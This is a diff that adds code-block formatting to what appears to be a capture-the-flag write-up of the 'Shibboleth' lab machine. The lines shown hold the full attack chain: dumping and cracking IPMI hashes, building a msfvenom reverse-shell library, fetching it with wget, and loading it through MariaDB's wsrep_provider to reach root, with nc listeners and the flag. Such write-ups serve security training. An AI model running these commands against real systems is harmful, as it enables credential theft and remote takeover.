@@ -106,6 +106,9 @@ Filtered Requests: 4986
 Requests/sec.: 56.54829
 ```
 
+
+
+```
 msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > show actions
 
@@ -159,11 +162,11 @@ msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > run
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
 msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) 
+```
 
 
 
-
-
+```bash
 hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt
 hashcat (v6.1.1) starting...
 
@@ -237,9 +240,9 @@ Hardware.Mon.#1..: Temp: 53c Util: 36% Core:1785MHz Mem:5000MHz Bus:8
 
 Started: Sun Dec  5 10:58:33 2021
 Stopped: Sun Dec  5 10:58:54 2021
+```
 
-
-
+```bash
 nc -lnvp 9001
 listening on [any] 9001 ...
 connect to [10.10.14.10] from (UNKNOWN) [10.129.228.134] 50404
@@ -322,7 +325,9 @@ ERROR 1231 (42000): Variable 'wsrep_provider' can't be set to the value of '/tmp
 MariaDB [zabbix]> exit
 exit
 Bye
+```
 
+```
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.10 LPORT=9002 -f elf-so -oexploit.so
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -330,11 +335,11 @@ No encoder specified, outputting raw payload
 Payload size: 74 bytes
 Final size of elf-so file: 476 bytes
 Saved as: exploit.so
+```
 
 
 
-
-
+```bash
 ipmi-svc@shibboleth:/$ cd /tmp
 cd /tmp
 ipmi-svc@shibboleth:/tmp$ wget http://10.10.14.10:800/exploit.so
@@ -368,10 +373,10 @@ MariaDB [zabbix]> SET GLOBAL wsrep_provider="/tmp/exploit.so";
 SET GLOBAL wsrep_provider="/tmp/exploit.so";
 ERROR 2013 (HY000): Lost connection to MySQL server during query
 MariaDB [zabbix]>
+```
 
 
-
-
+```bash
  nc -lnvp 9002
 listening on [any] 9002 ...
 connect to [10.10.14.10] from (UNKNOWN) [10.129.228.134] 58602
@@ -495,3 +500,4 @@ drwx------  2 root root 4096 Oct 18 15:36 scripts
 root@shibboleth:/root# cat root.txt
 cat root.txt
 34d1ed3260134b1dd983a6db6c174e88
+```
